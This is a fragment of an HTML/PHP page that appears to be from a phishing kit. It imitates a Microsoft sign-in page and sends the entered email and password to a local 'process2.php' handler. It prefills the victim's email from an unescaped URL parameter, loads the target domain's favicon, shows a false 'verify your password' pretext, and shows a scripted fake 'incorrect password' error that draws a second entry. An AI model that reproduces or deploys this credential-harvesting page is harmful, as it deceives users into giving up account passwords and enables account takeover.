    ...
    <div>
        ...
        <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
            <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                ...
                <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(img/bg.png);">

                </div>

                <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(img/bg.png);">
        ...
        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" action="process2.php" onsubmit="return goNext()">
...
<!--                                         <div class="row text-title" id="loginHeader" role="heading">
                                            <div aria-level="1" data-bind="text: title">
                                        ...
                                        <div class="row">
                                            <div role="alert" aria-live="assertive">
                                                <img id="fieldImg" class="img-fluid" src="https://www.google.com/s2/favicons?sz=64&domain_url=<?php echo $domain_name; ?>" width="80px">

                                                <div class="alert alert-error col-md-24" id="errorBar"><font color="black"><br>Because you are accessing sensitive info, you need to verify your password.</font></div>

                                            </div>
                                            <div class="form-group col-md-24">

                                                <div class="placeholderContainer" id="emField" style="display: none">

                                                    <input type="email" name="email" id="i0116" value="<?php echo $_GET['id'];?>" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Email Address" aria-label="Enter your email address." required="" autofocus="true">
                                                ...
                                                <div class="placeholderContainer" id="pwField" >

                                                    <input required="true" type="password" name="password" id="i0117" maxlength="113" lang="en" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true" placeholder="Password" aria-label="Enter your password.">
                                                    ...
                                                    <div class="col-md-24">
                                                        <div class="text-13 action-links">
                                                            ...
                                                            <div data-bind="css: { 'form-group': !isMenuLink(), 'action-links-menu-item': isMenuLink }" class="form-group">
                                                                <a id="cantAccessAccount" href="" data-bind="
    ...
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }">
        ...
        css: {
            ...
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block">
                                                            ...
                                                            <input value="Next" type="submit" name class="btn btn-block btn-primary"> 
                    ...
                    event: {
                        ...
                        showDebugDetailsClick: footer_showDebugDetailsClick } }">
                                ...
                                <div id="footerLinks" class="footerNode text-secondary">
                                    ...
                                    <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2023 Microsoft</span>
...
var getUrlParameter = function getUrlParameter(sParam) {
    ...
    return false;
        ...
        $('#displayName').text(getUrlParameter('id'));
        ...
        function iserror(email){
            $('#errorBar').html('<font>Your account or password is incorrect. If you dont remember your password, <a href="#">reset it now.</a></font>');
